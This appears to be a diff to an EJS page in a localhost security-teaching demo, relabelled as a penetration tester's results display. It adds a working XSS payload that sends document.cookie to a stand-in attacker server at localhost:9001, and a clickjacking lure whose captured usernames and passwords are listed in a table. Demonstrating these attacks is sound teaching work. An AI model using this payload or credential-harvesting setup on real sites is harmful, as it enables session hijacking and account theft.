@@ -5,14 +5,44 @@
     <meta name="viewport"
           content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
     <meta http-equiv="X-UA-Compatible" content="ie=edge">
-    <title>收集到的用户 cookies</title>
+    <title>渗透测试攻击者-成果展示</title>
+    <link rel="stylesheet" href="../static/style.css">
+    <style>
+        table {
+            border-collapse: collapse;
+            width: 300px;
+        }
+
+        th, td {
+            border: 1px solid grey;
+            text-align: center;
+        }
+    </style>
 </head>
 <body>
-<h1>收集到的 localhost:9000 的用户 cookies</h1>
+<h1>渗透测试攻击者-成果展示</h1>
+<p>1. 我们引入以下 xss 攻击，获取的用户的 cookie 信息：</p>
+<p>
+    <code>&lt;img src=null onerror=&quot;document.createElement(&#x27;img&#x27;).src=[&#x27;http://localhost:9001/add?a=&#x27;,encodeURIComponent(document.cookie)].join(&#x27;&#x27;)&quot;/&gt;   </code>
+</p>
 <ul>
     <% for (let i = 0; i < localhost9001Cookies.length; i ++) { %>
     <li><%= localhost9001Cookies[i] %></li>
     <% } %>
 </ul>
+<p>2. 我们引入诱导用户使用该页面，进行点击劫持，获取到的账号密码：</p>
+<p><code>http://localhost:9001/clickjacking</code></p>
+<table>
+    <tr>
+        <th>账号</th>
+        <th>密码</th>
+    </tr>
+    <% for (let j = 0; j < localhost9001user.length; j ++) { %>
+    <tr>
+        <td><%= localhost9001user[j].username %></td>
+        <td><%= localhost9001user[j].password %></td>
+    </tr>
+    <% } %>
+</table>
 </body>
 </html>
